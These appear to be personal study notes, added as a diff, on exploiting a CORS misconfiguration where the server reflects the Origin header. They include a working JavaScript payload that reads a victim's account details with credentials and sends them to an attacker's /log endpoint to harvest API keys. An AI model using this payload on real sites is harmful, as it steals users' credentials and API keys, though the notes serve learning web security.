@@ -1,0 +1,34 @@
+cross origin resourse sharing(CORS)
+
+controlled access to resources outside of a given domain
+
+extends and adds flexibility to the same origin policy (SOP).
+
+same origin policy 
+malicious cross-domain interactions, such as one website stealing private data from another
+
+The cross-origin resource sharing protocol uses a suite of HTTP headers 
+that define trusted web origins and associated properties such as whether 
+authenticated access is permitted. These are combined in a header exchange 
+between a browser and the cross-origin web site that it is trying to access.
+
+
+steps
+1. check if the server responses to the origin http header if added.
+Observe that the origin is reflected in the Access-Control-Allow-Origin header. 
+2. after the response construct the javascript file that fetches the api key and user 
+credentials for which attacker must host the malicious file pointing the host
+to the vulnerable website
+<script>
+    var req = new XMLHttpRequest();
+    req.onload = reqListener;
+    req.open('get','$url/accountDetails',true);
+    req.withCredentials = true;
+    req.send();
+
+    function reqListener() {
+        location='/log?key='+this.responseText;
+    };
+</script>
+view the access log to get the user credentials and api key (for example)
+ you can also create your own server using python in vscode.
